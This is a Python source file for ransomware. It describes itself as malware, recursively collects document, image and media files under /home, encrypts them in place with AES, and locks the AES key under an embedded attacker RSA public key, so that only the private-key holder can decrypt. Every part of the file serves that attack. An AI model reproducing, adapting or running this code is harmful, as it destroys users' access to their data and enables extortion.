import base64
import os
import sys
import hashlib
import secrets
import socket

#AES encryption
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

#RSA encryption
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes

#-------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Some global variables
DEBUG = True
USEALWAYSDEFAULTPUBLICPEM = False
NONCENSIZE=16

public_pem="""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAy/A9SQT+Bq1Mo4D4M+YV
+XAOEHKSVvW6+Okc3RUnVGxJw7BQUyPZNtUznarLY8/ZO3iptQOKHgA2GWrSlcqB
f1hgCf5i/Ke7SsxyUHV1M7vEbbIiJMdu94JsHuuRPXNSpOp6HbacmL0z591zXRfB
nHb1UQCFkLbaU4PJSF2bIdhxY7cb0AfWQGrc6TrbSxsLNFX/K/hOKR5/r2ydy3k+
jvJJ0kzTnLxFyK6iZBZgRjI8xUVmfnlqgJRTKTYo3sFU8CSTovoDKxHNMu+24StK
dozmSsWQGP08+oDEfv+oBqXvX1vlyBcVuco7eOiZVcCB6nB4iIkEj9TXzsw4gSzS
QwIDAQAB
-----END PUBLIC KEY-----
"""

VERIFICATIONFILE = "verification.txt"
VERIFICATIONTEXT = "The password is correct"
HASHFILE = "hash.txt"
LOGFILE = "log.txt"
EXTENSIONS = "pdf doc docx html webp xls ods ppt pptx jar jpg jpeg mp4 mp3 png"

#-------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Methods 

'''
To create info logs
'''
def logInfo(text):
    if DEBUG:
        open(LOGFILE,"a").write("INFO    "+text+"\n")


'''
To create error logs
'''
def logError(text):
    if DEBUG:
        open(LOGFILE,"a").write("ERROR   "+text+"\n")


'''
I create a password for AES using a hash encryption
'''
def create_hash():
    #Create a text using the host name and random characters
    futureHash = socket.gethostname() + secrets.token_urlsafe(32)
    futureHash = futureHash.encode('utf-8')

    #Create a password using the hash encryption sha512, then convert it to hexadecimal
    myhash = hashlib.sha512(futureHash)
    myhash = myhash.hexdigest()

    #Only want the first 32 characters
    return myhash[:32]

'''
I create a noncen that will allways be the same in the same host
Size -> numbers of bytes that the noncen will have
'''
def create_noncen(size):
    futureNoncen = socket.gethostname()
    futureNoncen = futureNoncen.encode('utf-8')

    #Create a password using the hash encryption sha512
    noncen = hashlib.sha512(futureNoncen)
    noncen = noncen.hexdigest()
    noncen = noncen.encode() #Now, is in bytes

    return noncen[:size]



'''
Method that creates a file to verified the decryption key
'''
def createVerificationFile(key):
    text = crypt_aes(key, create_noncen(NONCENSIZE), VERIFICATIONTEXT.encode())

    with open(VERIFICATIONFILE, 'wb') as verification:
        verification.write(text)
        
    
'''
Decrypts a file to verified the key is correct
'''
def vertificateFile(key):
    verified = True
    logInfo("verificando")
    try:
        verification = open(VERIFICATIONFILE, "rb").read()
        verification = crypt_aes(key, create_noncen(NONCENSIZE), verification)
        verification = verification.decode("utf-8")
        logInfo("Verification text: "+str(verification))
        if verification != VERIFICATIONTEXT:
            verified = False
    except ZeroDivisionError:
        verified = False
    return verified


'''
Method to load the AES hash and decrypt it
'''
def loadHash():
    #We can receive the private key in the argument or in a input
    myprivate = ""
    if len(sys.argv) == 2:
        myprivate = sys.argv[1]
    else:
        myprivate = input("The file where you have the private key: ")

    #Open file
    myprivate = open(myprivate).read()

    #Create the private key object
    logInfo("Private key: "+myprivate)
    myprivate = myprivate.encode()
    private_key = serialization.load_pem_private_key(
        myprivate,
        password=None,
        backend=default_backend()
    )

    #Extract the encrypted hash
    encryptedHash = open(HASHFILE, "r").read()

    #Decrypt the hash
    hash = private_key.decrypt(
    base64.b64decode(encryptedHash),
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )    
    )
    
    return hash



'''
Method to save the AES hash in a file, but before that we cipher the file with rsa
'''
def saveHash(hash):
    #If there is an argument the argument is the key
    mypublic = ""
    if len(sys.argv) == 2:
        mypublic = sys.argv[1]
        try:
            mypublic = open(mypublic,"r").read()
            print(mypublic)
        except:
            logError("The file in the argument can't be read")
    
    #Cases in where we are going to use the default key
    if USEALWAYSDEFAULTPUBLICPEM or len(mypublic)!=len(public_pem):
        mypublic = public_pem
        
    logInfo("RSA public key: "+mypublic)
    mypublic = mypublic.encode()
    
    #Create the public key object
    try:
        public_key = serialization.load_pem_public_key(
            mypublic,
            backend=default_backend()
        )
    except:
        logError("There has been a problem with the RSA key, we are going to use the default one")
        #If the key has a problem we use the default key
        public_pem.encode()
        public_key = serialization.load_pem_public_key(
            public_pem,
            backend=default_backend()
        )
    
    #Ecnrypt the hash password for the AES encryption
    logInfo("Hash decrypted: "+str(hash.decode()))
    encrypted = base64.b64encode(public_key.encrypt(
        hash,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        ))
    )
    logInfo("Hash encrypted: "+str(encrypted.decode()))

    #Save the hash in a file
    hash = open(HASHFILE, "wb")
    hash.write(encrypted)
    hash.close()


'''
Method to crypt with the aes algorithm

Key -> the hash password
Nonce -> a noncen pseudorandom with a seed for each host
Plaintext -> the text is going to be encrypted/decrypted
'''
def crypt_aes(key, nonce, plaintext):
    cipher = Cipher(algorithms.AES(key), modes.CTR(nonce), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext) + encryptor.finalize()
    return ciphertext


'''
Encrypt and decrypt the files
Thanks we are using symmetric cryptography we can
encrypt and decrypt the files in the same way

File -> the name of the file we are going to crypt
Crypto -> the object that is going to crypt our text
Size -> the number of bytes that are going to have the blocks that we are going to crypt, every file will be split into blocks
'''
def crypt(key, file, size):
    #Binary lecture of the file
    with open(file, 'r+b') as encryptFile:
        content = encryptFile.read(size)

        #This loop works if there is text to crypt
        while content:  
            #Cypt the content and save it in message
            message = crypt_aes(key,create_noncen(size),content)

            if len(content) != len(message):
                #The text before and after being crypt should have the same lenght
                raise ValueError('Lenght error due to a bad crypt practise in file '+str(file))
            
            #Move the bytes in the file
            encryptFile.seek(- len(content), 1)
            
            #Rewrite the content of the file to an encrypted/decrypted one 
            encryptFile.write(message) 

            #Take the next bytes that has to be encrypted/decrypted
            content = encryptFile.read(size)  


'''
Create a list of all the files
It's a recursive method

List_files -> the list with all the files that have been already found
Start -> the directory were we have to search for files in this execution
'''
def files_recursive(list_files, start):
    #Take the correct os path direction
    destination = os.path.abspath(start)

    #Obtain a list with the files in that path
    files = os.listdir(destination)
    
    logInfo("In directory "+str(start)+" are these files: "+str(", ".join(files)))

    for file in files:
        if not("." in file):
            #In a directory
            try:
                list_files = files_recursive(list_files, start+"/"+file)
            except:
                logError(str(file)+" not a directory")

        elif(file != ""):
            #It is a file with an extension
            if file.split(".")[-1] in  EXTENSIONS.split(" "):
                #It is one of the extensions we are looking for
                list_files.append(os.path.join(start+"/"+file))
    return list_files

'''
Create a list of files calling the recursive version of this method
'''
def files():
    #Call the recursive method to obtain the list of files
    list_files = files_recursive([],"/home")

    logInfo("All the files: "+str(", ".join(list_files)))

    if DEBUG:
        #Write in a file the list of files
        try:
            open("list_files","w+").write("\n".join(list_files))
        except TypeError:
            raise RuntimeError("There are no files")
        
    return list_files

'''
The execution of the malware
'''
def execute():
    #Obtain the list of files
    list_files = files()
    logInfo("List of files: "+", ".join(list_files))

    if os.path.exists(HASHFILE):
        #Decrypt the files
        logInfo("We are going to decrypt")

        #Read the hash in the file
        key = loadHash()
        
        #Verify the hash
        if vertificateFile(key):
            #If the key is correct all the files are decrypted
            logInfo("key "+str(key))

            #Call the crypt method for everyfile
            for file in list_files:
                crypt(key,file,16)

            #Remove the hash and verification files
            os.remove(HASHFILE)
            os.remove(VERIFICATIONFILE)

        else:
            #The key is incorrect
            logInfo("Incorrect key")
            print("Incorrect key")
    else:
        #Encrypt files
        logInfo("We are going to encrypt")

        #Create new key
        key = create_hash()
        logInfo("The password: "+str(key))
        key = key.encode("utf-8")


        #Save key with rsa encryption
        saveHash(key)

        #Create a verification file
        createVerificationFile(key)

        #Call the crypt method for everyfile
        for file in list_files:
            crypt(key,file,16)

#-------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Execution

try:
    if DEBUG:
        open(LOGFILE,"w").write("")
    execute()
except KeyboardInterrupt:
    logError("KeyBoardInterrupt")
    exit()
